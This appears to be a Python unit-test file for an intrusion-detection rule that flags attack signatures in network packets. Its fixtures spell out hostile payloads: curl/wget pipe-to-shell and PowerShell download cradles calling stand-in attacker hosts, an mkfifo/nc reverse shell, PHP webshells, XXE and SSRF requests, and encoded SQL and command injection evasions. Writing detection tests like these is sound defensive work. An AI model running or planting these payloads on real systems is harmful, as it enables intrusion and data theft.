import os
import sys
import unittest

PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from engine.rules import PayloadRule


class TestPayloadRule(unittest.TestCase):
    def setUp(self):
        self.rule = PayloadRule(max_bytes=128, stream_timeout=5, max_streams=2)

    @staticmethod
    def packet(payload, seq, ts=100, **overrides):
        record = {
            "type": "IP", "protocol": "TCP", "src_ip": "192.0.2.10",
            "dst_ip": "192.0.2.80", "src_port": 40000, "dst_port": 80,
            "payload": payload, "tcp_payload_seq": seq, "timestamp": ts,
        }
        record.update(overrides)
        return record

    def test_packet_payload_signature_still_fires(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION SELECT password", 1000))
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_invalid_buffer_and_cooldown_settings_use_safe_defaults(self):
        rule = PayloadRule(
            max_bytes=0, stream_timeout="invalid", max_streams=-1,
            alert_cooldown=float("nan"),
        )
        self.assertEqual(rule.max_bytes, 512)
        self.assertEqual(rule.stream_timeout, 30)
        self.assertEqual(rule.max_streams, 2048)
        self.assertEqual(rule.alert_cooldown, 60.0)
        alert = rule.check(self.packet(b"GET /?q=UNION SELECT", 1000))
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_malformed_sequence_skips_reassembly_but_still_inspects_packet(self):
        record = self.packet(b"GET /?q=UNION SELECT password", 1000)
        record["tcp_payload_seq"] = "malformed"
        alert = self.rule.check(record)
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])
        self.assertEqual(self.rule._streams, {})

    def test_invalid_event_timestamp_skips_state_but_preserves_packet_signature(self):
        for invalid_time in ("bad-time", float("nan"), float("inf")):
            with self.subTest(timestamp=invalid_time):
                rule = PayloadRule(alert_cooldown=60)
                record = self.packet(
                    b"GET /?q=UNION SELECT password", 1000,
                    event_timestamp=invalid_time)
                alert = rule.check(record)
                self.assertIsNotNone(alert)
                self.assertIn("SQL_INJECTION", [
                    hit["signature"] for hit in alert["evidence"]["hits"]
                ])
                self.assertEqual(rule._streams, {})
                self.assertEqual(rule._alerted, {})

    def test_normal_cdata_xml_is_not_misclassified_as_xxe(self):
        alert = self.rule.check(self.packet(
            b"POST /soap HTTP/1.1\\r\\n\\r\\n<![CDATA[ordinary content]]>", 7000))
        self.assertIsNone(alert)

    def test_external_entity_xxe_still_fires(self):
        alert = self.rule.check(self.packet(
            b'POST /xml HTTP/1.1\\r\\n\\r\\n<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
            8000, src_port=40008))
        self.assertIsNotNone(alert)
        self.assertIn("XXE", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_external_doctype_xxe_still_fires(self):
        alert = self.rule.check(self.packet(
            b'POST /xml HTTP/1.1\r\n\r\n<!DOCTYPE x SYSTEM "http://attacker.test/evil.dtd"><x/>',
            8050, src_port=40008))
        self.assertIsNotNone(alert)
        self.assertIn("XXE", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_standard_html_public_doctype_is_not_xxe(self):
        alert = self.rule.check(self.packet(
            b'Content-Type: text/html\r\n\r\n'
            b'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" '
            b'"http://www.w3.org/TR/REC-html40/loose.dtd">',
            8075, dst_port=587))
        self.assertIsNone(alert)

    def test_static_document_write_is_not_xss(self):
        alert = self.rule.check(self.packet(
            b'HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript\r\n\r\n'
            b"document.write('<iframe src=\"http://ads.example/banner\"></iframe>');",
            8080, src_port=80, dst_port=2375))
        self.assertIsNone(alert)

    def test_document_write_of_user_controlled_location_still_fires_xss(self):
        alert = self.rule.check(self.packet(
            b'GET /script.js HTTP/1.1\r\n\r\ndocument.write(location.search);',
            8090))
        self.assertIsNotNone(alert)
        self.assertIn("XSS", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_repeated_payload_signature_is_cooled_down_per_host_service(self):
        rule = PayloadRule(alert_cooldown=60)
        first = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, src_port=40009))
        second = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40009))
        other_flow = rule.check(self.packet(b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40010))
        other_service = rule.check(self.packet(
            b"GET /?q=UNION SELECT", 9000, ts=101, src_port=40011, dst_port=8080))
        self.assertIsNotNone(first)
        self.assertIsNone(second)
        self.assertIsNone(other_flow)
        self.assertIsNotNone(other_service)

    def test_late_payload_event_does_not_clear_newer_cooldown(self):
        rule = PayloadRule(alert_cooldown=60)
        payload = b"GET /?q=UNION SELECT"
        self.assertIsNotNone(rule.check(self.packet(payload, 9000, ts=100)))
        rule.prune_stale(99)
        self.assertEqual(len(rule._alerted), 1)
        self.assertIsNone(rule.check(self.packet(payload, 9000, ts=99)))
        self.assertIsNone(rule.check(self.packet(payload, 9000, ts=101)))
        self.assertIsNotNone(rule.check(self.packet(payload, 9000, ts=160)))

    def test_active_signature_cooldown_survives_alert_key_churn(self):
        rule = PayloadRule(alert_cooldown=60)
        rule._max_alert_states = 2
        payload = b"GET /?q=UNION SELECT"

        def send(dst, ts):
            return rule.check(self.packet(payload, 9000, ts=ts, dst_ip=dst))

        self.assertIsNotNone(send("192.0.2.80", 100))  # alert A
        self.assertIsNotNone(send("192.0.2.81", 101))  # alert B
        self.assertIsNone(send("192.0.2.80", 102))  # refresh A's LRU position
        self.assertIsNotNone(send("192.0.2.82", 103))  # evict B
        self.assertIsNone(send("192.0.2.80", 104))  # A's cooldown survives

    def test_cooldown_is_scoped_to_transport_protocol(self):
        rule = PayloadRule(alert_cooldown=60)
        payload = b"GET /?q=UNION SELECT"
        tcp = self.packet(payload, 9000, ts=100)
        udp = self.packet(payload, 9000, ts=101, protocol="UDP")
        tcp_alert = rule.check(tcp)
        udp_alert = rule.check(udp)
        self.assertIsNotNone(tcp_alert)
        self.assertIsNotNone(udp_alert)

    def test_percent_and_form_encoded_signatures_are_detected(self):
        percent = self.rule.check(self.packet(b"GET /?q=%55NION%20SELECT", 1000))
        self.assertIsNotNone(percent)
        self.assertEqual(percent["evidence"]["hits"][0]["representation"], "percent_decoded")
        form = self.rule.check(self.packet(
            b"GET /?q=UNION+SELECT", 2000, src_port=40001, dst_port=8080))
        self.assertIsNotNone(form)
        self.assertEqual(form["evidence"]["hits"][0]["representation"], "form_decoded")

    def test_encoded_literal_plus_is_not_misread_as_form_space(self):
        alert = self.rule.check(self.packet(b"GET /?q=UNION%2BSELECT", 3000))
        self.assertIsNone(alert)

    def test_signature_split_across_contiguous_segments_fires(self):
        first = b"GET /?q=UNION SEL"
        second = b"ECT password FROM users"
        self.assertIsNone(self.rule.check(self.packet(first, 1000)))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertEqual(alert["evidence"]["inspection"], "packet_and_bounded_tcp_stream")

    def test_raw_header_injection_split_across_tcp_segments_fires(self):
        first = b"GET /?next=value\r\nSet-"
        second = b"Cookie: admin=1 HTTP/1.1\r\n"
        self.assertIsNone(self.rule.check(self.packet(first, 2000)))
        alert = self.rule.check(self.packet(second, 2000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertIn("HEADER_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_new_connection_reusing_tuple_resets_tcp_stream_sequence_space(self):
        old_prefix = self.packet(b"UNION SEL", 1000, ts=100)
        old_prefix.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(old_prefix))

        # New initial sequence on the same 4-tuple marks a distinct connection.
        syn = self.packet(b"", 1010, ts=101, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1009)
        self.assertIsNone(self.rule.check(syn))

        # The new connection's partial payload must be joined only to its own
        # subsequent bytes, even though the sequence happens to follow the old flow.
        new_prefix = self.packet(b"UNION SEL", 1010, ts=102)
        new_prefix.update(tcp_flags=0x18, tcp_seq=1009)
        self.assertIsNone(self.rule.check(new_prefix))
        suffix = self.packet(b"ECT password", 1019, ts=103)
        suffix.update(tcp_flags=0x18, tcp_seq=1018)
        alert = self.rule.check(suffix)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["rule_version"], "1.23")
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_retransmitted_syn_does_not_reset_current_tcp_stream(self):
        syn = self.packet(b"", 1001, ts=100, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1000)
        self.assertIsNone(self.rule.check(syn))
        first = self.packet(b"UNION SEL", 1001, ts=101)
        first.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(first))

        retransmitted_syn = dict(syn, timestamp=102)
        self.assertIsNone(self.rule.check(retransmitted_syn))
        suffix = self.packet(b"ECT password", 1010, ts=103)
        suffix.update(tcp_flags=0x18, tcp_seq=1009)
        alert = self.rule.check(suffix)
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_new_connection_does_not_join_payload_from_previous_connection(self):
        old_prefix = self.packet(b"UNION SEL", 1000, ts=100)
        old_prefix.update(tcp_flags=0x18, tcp_seq=1000)
        self.assertIsNone(self.rule.check(old_prefix))

        # The new ISN is adjacent to the old stream's expected sequence. Without
        # connection tracking, its payload would complete the old SQL signature.
        syn = self.packet(b"", 1009, ts=101, initial_syn=True,
                          tcp_flags=0x02, tcp_seq=1008)
        self.assertIsNone(self.rule.check(syn))
        suffix = self.packet(b"ECT password", 1009, ts=102)
        suffix.update(tcp_flags=0x18, tcp_seq=1008)
        self.assertIsNone(self.rule.check(suffix))

    def test_sequence_gap_does_not_join_unrelated_payloads(self):
        self.assertIsNone(self.rule.check(self.packet(b"UNION ", 1000)))
        self.assertIsNone(self.rule.check(self.packet(b"SELECT", 2000, ts=101)))

    def test_out_of_order_segments_are_joined_only_after_gap_is_filled(self):
        first = b"UNION "
        middle = b"SEL"
        last = b"ECT"
        self.assertIsNone(self.rule.check(self.packet(first, 1000, ts=100)))
        # Queue the tail while bytes between it and the current stream are missing.
        self.assertIsNone(self.rule.check(self.packet(last, 1000 + len(first) + len(middle), ts=101)))
        alert = self.rule.check(self.packet(middle, 1000 + len(first), ts=102))
        self.assertIsNotNone(alert)

    def test_in_order_segment_discards_a_fully_covered_queued_segment(self):
        first = b"ordinary "
        queued = b"bytes"
        self.rule.check(self.packet(first, 1000, ts=100))
        self.rule.check(
            self.packet(queued, 1000 + len(first) + 3, ts=101)
        )
        key = ("192.0.2.10", 40000, "192.0.2.80", 80)
        self.assertIn(1000 + len(first) + 3, self.rule._streams[key][3])

        # This in-order segment advances past all of the queued bytes.
        self.rule.check(
            self.packet(b"middle" + queued, 1000 + len(first), ts=102)
        )
        self.assertEqual(self.rule._streams[key][3], {})

        # New out-of-order data must still be accepted after the old segment
        # was retired from the bounded queue.
        next_seq = self.rule._streams[key][0]
        self.rule.check(self.packet(b"next", next_seq + 2, ts=103))
        self.assertEqual(list(self.rule._streams[key][3].values()), [b"next"])

    def test_retransmitted_segment_does_not_repeat_stream_match(self):
        first = b"UNION SEL"
        second = b"ECT password"
        self.rule.check(self.packet(first, 1000))
        alert = self.rule.check(self.packet(second, 1000 + len(first), ts=101))
        self.assertIsNotNone(alert)
        self.assertIsNone(self.rule.check(self.packet(second, 1000 + len(first), ts=102)))

    def test_sequence_wraparound_is_contiguous(self):
        first = b"UNION SEL"
        start = 0xFFFFFFFC
        self.rule.check(self.packet(first, start))
        second_seq = (start + len(first)) & 0xFFFFFFFF
        alert = self.rule.check(self.packet(b"ECT", second_seq, ts=101))
        self.assertIsNotNone(alert)

    def test_stream_state_expires_and_flow_count_is_bounded(self):
        self.rule.check(self.packet(b"UNION ", 1000))
        self.rule.check(self.packet(b"harmless", 2000, ts=101, src_port=40001))
        self.rule.check(self.packet(b"harmless", 3000, ts=102, src_port=40002))
        self.assertLessEqual(len(self.rule._streams), 2)
        self.rule.prune_stale(200)
        self.assertEqual(self.rule._streams, {})

    def test_stream_capacity_evicts_least_recently_active_flow(self):
        self.rule.check(self.packet(b"first", 1000, src_port=40000))
        self.rule.check(self.packet(b"second", 2000, src_port=40001))
        self.rule.check(self.packet(b"touch", 1005, src_port=40000, ts=102))
        self.rule.check(self.packet(b"third", 3000, src_port=40002, ts=103))
        self.assertIn(("192.0.2.10", 40000, "192.0.2.80", 80), self.rule._streams)
        self.assertNotIn(("192.0.2.10", 40001, "192.0.2.80", 80), self.rule._streams)

    def test_fin_or_rst_releases_stream_state(self):
        self.rule.check(self.packet(b"ordinary", 1000, tcp_flags=0x04))
        self.assertEqual(self.rule._streams, {})

    def test_double_url_encoded_sqli_is_detected(self):
        # %2555 -> %55 -> U; %2520 -> %20 -> space
        alert = self.rule.check(self.packet(b"GET /?q=%2555NION%2520SELECT", 4000))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_command_substitution_requires_recognizable_command(self):
        benign = self.rule.check(self.packet(
            b"POST /mail HTTP/1.1\r\n\r\nQuoted phrase: \x60a long time ago\x60",
            8100, dst_port=587))
        attack = PayloadRule().check(self.packet(
            b"GET /search?q=\x60id\x60 HTTP/1.1\r\n\r\n", 8200))
        self.assertIsNone(benign)
        self.assertIsNotNone(attack)
        self.assertIn("CMD_INJECTION", [h["signature"] for h in attack["evidence"]["hits"]])

    def test_shell_command_substitution_still_fires(self):
        alert = self.rule.check(self.packet(
            b"GET /search?q=$(whoami) HTTP/1.1\r\n\r\n", 8300))
        self.assertIsNotNone(alert)
        self.assertIn("CMD_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_file_uri_in_message_body_is_not_ssrf_without_fetch_context(self):
        alert = self.rule.check(self.packet(
            b"MAIL FROM:<sender@example.test>\r\nDATA\r\n"
            b"Personal note: file:///D:/Documents/letter.txt\r\n",
            8400, dst_port=587))
        self.assertIsNone(alert)

    def test_file_uri_in_fetch_parameter_still_fires_ssrf(self):
        alert = self.rule.check(self.packet(
            b"GET /proxy?url=file:///etc/passwd HTTP/1.1\r\n\r\n", 8500))
        self.assertIsNotNone(alert)
        self.assertIn("SSRF", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_starttls_handshake_and_ciphertext_are_not_payload_inspected(self):
        rule = PayloadRule()
        starttls = self.packet(
            b"\x16\x03\x03\x00\x20\x01\x00\x00\x1c\x60file://",
            8600, dst_port=587, ts=100)
        encrypted = self.packet(
            b"\x17\x03\x03\x00\x20\x60/bin/sh",
            8620, dst_port=587, ts=101)
        self.assertIsNone(rule.check(starttls))
        self.assertIsNone(rule.check(encrypted))
        self.assertEqual(len(rule._tls_flows), 1)

    def test_tls_flow_suppression_expires_before_later_cleartext_is_inspected(self):
        rule = PayloadRule(stream_timeout=5)
        starttls = self.packet(
            b"\x16\x03\x03\x00\x20\x01\x00\x00\x1c",
            8700, ts=100, dst_port=587)
        later_cleartext = self.packet(
            b"GET /?q=UNION SELECT password HTTP/1.1\r\n\r\n",
            8900, ts=106, dst_port=587)

        self.assertIsNone(rule.check(starttls))
        alert = rule.check(later_cleartext)
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])
        self.assertEqual(rule._tls_flows, {})

    def test_truncated_html_color_is_not_a_sql_comment(self):
        alert = self.rule.check(self.packet(
            b"POST /mail HTTP/1.1\r\n\r\n<BODY bgColor=#",
            9000, dst_port=587))
        self.assertIsNone(alert)

    def test_mysql_hash_comment_marker_still_fires(self):
        for index, request in enumerate((
            b"GET /search?q=admin' #",
            b"GET /search?q=admin#",
        )):
            rule = PayloadRule()
            alert = rule.check(self.packet(request, 9100 + index))
            self.assertIsNotNone(alert, request)
            self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_hash_at_packet_start_is_not_a_sql_comment(self):
        self.assertIsNone(self.rule.check(self.packet(b"#", 9200, dst_port=587)))

    def test_hash_before_embedded_line_break_is_not_a_sql_comment(self):
        self.assertIsNone(self.rule.check(self.packet(
            b"binary-fragment%#\n\xc4\x0f\x9f\xf2", 9250, dst_port=587)))

    def test_mysql_hash_comment_before_newline_still_fires(self):
        alert = PayloadRule().check(self.packet(
            b"GET /search?q=admin#\r\nHost: example.test\r\n", 9260))
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_sql_comment_marker_at_truncated_sample_boundary_is_not_a_hit(self):
        for marker in (b"#", b"----"):
            for extra_len in (0, 1):
                with self.subTest(marker=marker, extra_len=extra_len):
                    rule = PayloadRule(max_bytes=128)
                    prefix = b"GET /?q=admin"
                    payload = prefix + b"A" * (128 - len(prefix) - len(marker)) + marker
                    self.assertEqual(len(payload), 128)
                    record = self.packet(
                        payload, 9270, payload_len=len(payload) + extra_len)
                    self.assertIsNone(rule.check(record))

    def test_new_tcp_connection_reuse_clears_tls_suppression(self):
        rule = PayloadRule(stream_timeout=30)
        tls = self.packet(b"\x16\x03\x03\x00\x20\x01", 9300, ts=100, dst_port=587)
        new_syn = self.packet(
            b"", 0, ts=101, dst_port=587, initial_syn=True, tcp_flags=0x02,
            tcp_payload_seq=None)
        cleartext = self.packet(
            b"GET /?q=UNION SELECT password HTTP/1.1\r\n\r\n",
            9400, ts=102, dst_port=587)

        self.assertIsNone(rule.check(tls))
        self.assertIsNone(rule.check(new_syn))
        alert = rule.check(cleartext)
        self.assertIsNotNone(alert)
        self.assertIn("SQL_INJECTION", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_double_url_encoded_path_traversal(self):
        # Double-encoded ../../ and double-encoded win.ini:
        # %252e%252e/%252e%252e/ -> %2e%2e/%2e%2e/ -> ../../
        # %2577%2569%256e%252e%2569%256e%2569 -> %77%69%6e%2e%69%6e%69 -> win.ini
        alert = self.rule.check(self.packet(b"GET /dl?f=%252e%252e/%252e%252e/%2577%2569%256e%252e%2569%256e%2569", 4100))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "PATH_TRAVERSAL")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_triple_url_encoded_command_injection(self):
        # %25252fbin%25252fsh -> %252fbin%252fsh -> %2fbin%2fsh -> /bin/sh
        alert = self.rule.check(self.packet(b"GET /run?c=%25252fbin%25252fsh", 4200))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "multi_pass_decoded")

    def test_null_byte_word_splitting_evasion(self):
        # /bin/s\x00h -> /bin/sh via null_byte_stripped
        alert = self.rule.check(self.packet(b"GET /run?c=/bin/s%00h", 4300))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "CMD_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_stripped")

    def test_null_byte_token_separation_evasion(self):
        # UNION\x00SELECT -> UNION SELECT via null_byte_normalized
        alert = self.rule.check(self.packet(b"GET /?q=UNION%00SELECT", 4400))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "null_byte_normalized")

    def test_inline_sql_comment_evasion(self):
        # UNION/**/SELECT -> UNION SELECT via comment_normalized
        alert = self.rule.check(self.packet(b"GET /search?id=1'/**/UNION/**/SELECT/**/1,2", 4500))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_or_1_equals_1_inline_comment_evasion(self):
        alert = self.rule.check(self.packet(b"GET /login?user=admin'/*comment*/OR/*comment*/1=1", 4600))
        self.assertIsNotNone(alert)
        hit = alert["evidence"]["hits"][0]
        self.assertEqual(hit["signature"], "SQL_INJECTION")
        self.assertEqual(hit["representation"], "comment_normalized")

    def test_scanner_probe_user_agents(self):
        for ua in (b"sqlmap/1.7#stable", b"Mozilla/5.00 (Nikto/2.1.6)", b"gobuster/3.1.0", b"nuclei"):
            pkt = self.packet(b"GET /api HTTP/1.1\r\nUser-Agent: " + ua + b"\r\n\r\n", 5000)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for scanner User-Agent: {ua}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SCANNER_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_sensitive_file_probe(self):
        for path in (b"/.env", b"/.env.local", b"/.git/config", b"/id_rsa", b"/.aws/credentials", b"/wp-config.php"):
            pkt = self.packet(b"GET " + path + b" HTTP/1.1\r\nHost: example.com\r\n\r\n", 5100)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for sensitive file probe: {path}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("SENSITIVE_FILE_PROBE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_reverse_shell_cradle(self):
        cradles = (
            b"; curl http://attacker.com/sh | sh ;",
            b"; wget -qO- http://attacker.com/b | bash ;",
            b"powershell -nop -enc JABzAD0...",
            b"IEX (New-Object Net.WebClient).DownloadString('http://bad.com/p')",
            b"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
        )
        for cradle in cradles:
            pkt = self.packet(b"POST /submit HTTP/1.1\r\nContent-Length: 100\r\n\r\ncmd=" + cradle, 5200)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for reverse shell cradle: {cradle}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("REVERSE_SHELL_CRADLE", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_http_method_tampering_and_webdav(self):
        tamper_requests = (
            b"TRACE / HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"TRACK / HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DEBUG /test.aspx HTTP/1.1\r\nHost: example.com\r\nCommand: stop-debug\r\n\r\n",
            b"PROPFIND /webdav/ HTTP/1.1\r\nHost: example.com\r\nDepth: 1\r\n\r\n",
            b"GET /login.asp HTTP/1.1\r\nHost: example.com\r\nTranslate: f\r\n\r\n",
            b"DELETE /api/v1/admin/users/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for req in tamper_requests:
            pkt = self.packet(req, 5400)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for HTTP method tampering: {req}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("HTTP_METHOD_TAMPERING", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_management_delete_patch_paths_fire_at_segment_boundaries(self):
        requests = (
            b"DELETE /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/admin/users/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DELETE /api/v1/config HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /actuator/env HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"DELETE /manage?all=true HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for index, request in enumerate(requests):
            rule = PayloadRule(max_bytes=128)
            alert = rule.check(self.packet(request, 5600 + index, src_port=40100 + index))
            self.assertIsNotNone(alert, request)
            self.assertIn("HTTP_METHOD_TAMPERING", [h["signature"] for h in alert["evidence"]["hits"]])

    def test_normal_query_headers_and_prefixed_management_paths_do_not_fire(self):
        requests = (
            b"GET /api?x=y HTTP/1.1\r\nContent-Type: application/json\r\n\r\n",
            b"GET /api?x=y HTTP/1.1\r\nLocation: /home\r\n\r\n",
            b"GET /api?x=y HTTP/1.1\r\nSet-Cookie: session=ok\r\n\r\n",
            b"DELETE /administrator HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/administer HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for index, request in enumerate(requests):
            rule = PayloadRule(max_bytes=128)
            self.assertIsNone(rule.check(self.packet(request, 5700 + index, src_port=40200 + index)), request)

    def test_webshell_injection(self):
        shells = (
            b"<?php system($_GET['cmd']); ?>",
            b"<?php eval(base64_decode($_POST['c'])); ?>",
            b"POST /upload.php HTTP/1.1\r\n\r\ncode=assert($_REQUEST['x'])",
            b"POST /api HTTP/1.1\r\n\r\nRuntime.getRuntime().exec(\"id\")",
        )
        for shell in shells:
            pkt = self.packet(shell, 5500)
            alert = self.rule.check(pkt)
            self.assertIsNotNone(alert, f"Expected alert for webshell marker: {shell}")
            signatures = [h["signature"] for h in alert["evidence"]["hits"]]
            self.assertIn("WEBSHELL_INJECTION", signatures)
            self.assertEqual(alert["severity"], "high")

    def test_benign_web_traffic_does_not_fire(self):
        benign_requests = (
            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n",
            b"GET /static/css/app.css HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0)\r\n\r\n",
            b"POST /api/contact HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.88.1\r\nContent-Length: 18\r\n\r\nname=Alice&env=prod",
            b"PUT /api/v1/user/10 HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"name\":\"bob\"}",
            b"DELETE /api/v1/user/10 HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"PATCH /api/v1/settings HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"active\":true}",
            b"OPTIONS * HTTP/1.1\r\nHost: example.com\r\n\r\n",
            b"GET /tracking/order?id=123 HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        for req in benign_requests:
            pkt = self.packet(req, 5300)
            alert = self.rule.check(pkt)
            self.assertIsNone(alert, f"Unexpected alert on benign request: {req}")


    def test_header_injection_ipv6_handling(self):
        # Public bracketed IPv6 Host header should not trigger SSRF HEADER_INJECTION
        public_ipv6_req = (
            b"GET /index.html HTTP/1.1\r\n"
            b"Host: [2001:db8::1]\r\n"
            b"User-Agent: Mozilla/5.0\r\n\r\n"
        )
        pkt_public = self.packet(public_ipv6_req, 5301)
        self.assertIsNone(self.rule.check(pkt_public))

        # Loopback and link-local IPv6 Host header should trigger SSRF HEADER_INJECTION
        loopback_req = (
            b"GET /admin HTTP/1.1\r\n"
            b"Host: [::1]\r\n"
            b"User-Agent: curl/7.88.1\r\n\r\n"
        )
        pkt_loopback = self.packet(loopback_req, 5302)
        alert = self.rule.check(pkt_loopback)
        self.assertIsNotNone(alert)
        signatures = [h["signature"] for h in alert["evidence"]["hits"]]
        self.assertIn("HEADER_INJECTION", signatures)

    def test_header_injection_x_forwarded_for_loopback_and_metadata(self):
        for header_val in (b"127.0.0.1", b"127.0.0.2", b"[::1]", b"::1", b"169.254.169.254", b"localhost"):
            with self.subTest(header=header_val):
                req = (
                    b"GET /api/v1/auth HTTP/1.1\r\n"
                    b"Host: example.internal\r\n"
                    b"X-Forwarded-For: " + header_val + b"\r\n\r\n"
                )
                pkt = self.packet(req, 5400)
                alert = self.rule.check(pkt)
                self.assertIsNotNone(alert, f"Expected alert for X-Forwarded-For: {header_val}")
                signatures = [h["signature"] for h in alert["evidence"]["hits"]]
                self.assertIn("HEADER_INJECTION", signatures)

    def test_header_injection_line_anchoring_prevents_body_fps(self):
        # Header text appearing mid-line in POST body must not trigger HEADER_INJECTION
        req = (
            b"POST /submit HTTP/1.1\r\n"
            b"Host: example.internal\r\n"
            b"Content-Type: text/plain\r\n\r\n"
            b"The user asked about X-Forwarded-For: 127.0.0.1 configuration\r\n"
        )
        pkt = self.packet(req, 5401)
        alert = self.rule.check(pkt)
        self.assertIsNone(alert, "Mid-line header mention in body should not alert")

    def test_header_injection_host_subdomain_prevents_fps(self):
        # Host with subdomain localhost.example.com must not trigger SSRF HEADER_INJECTION
        req = (
            b"GET /index.html HTTP/1.1\r\n"
            b"Host: localhost.example.com\r\n"
            b"User-Agent: curl/7.88.1\r\n\r\n"
        )
        pkt = self.packet(req, 5402)
        self.assertIsNone(self.rule.check(pkt))

    def test_payload_rule_cooldown_with_string_dst_port(self):
        # Ensure string port in record does not cause TypeError in cooldown flow_key
        req = b"GET /?x=%0d%0aSet-Cookie:admin=1 HTTP/1.1\r\n"
        pkt = self.packet(req, 5403, dst_port="80")
        alert = self.rule.check(pkt)
        self.assertIsNotNone(alert)
        self.assertEqual(alert["dst_port"], 80)

    def test_https_ssrf_detected(self):
        # HTTPS protocol scheme targeting cloud metadata or loopback
        for payload in (
            b"GET /proxy?url=https://169.254.169.254/latest/meta-data/ HTTP/1.1\r\n\r\n",
            b"POST /fetch HTTP/1.1\r\n\r\nurl=https://127.0.0.1:8443/admin",
            b"GET /webhook?dest=https://metadata.google/computeMetadata/v1/ HTTP/1.1\r\n\r\n",
        ):
            with self.subTest(payload=payload):
                rule = PayloadRule()
                pkt = self.packet(payload, 5404)
                alert = rule.check(pkt)
                self.assertIsNotNone(alert)
                self.assertEqual(alert["rule_version"], "1.23")
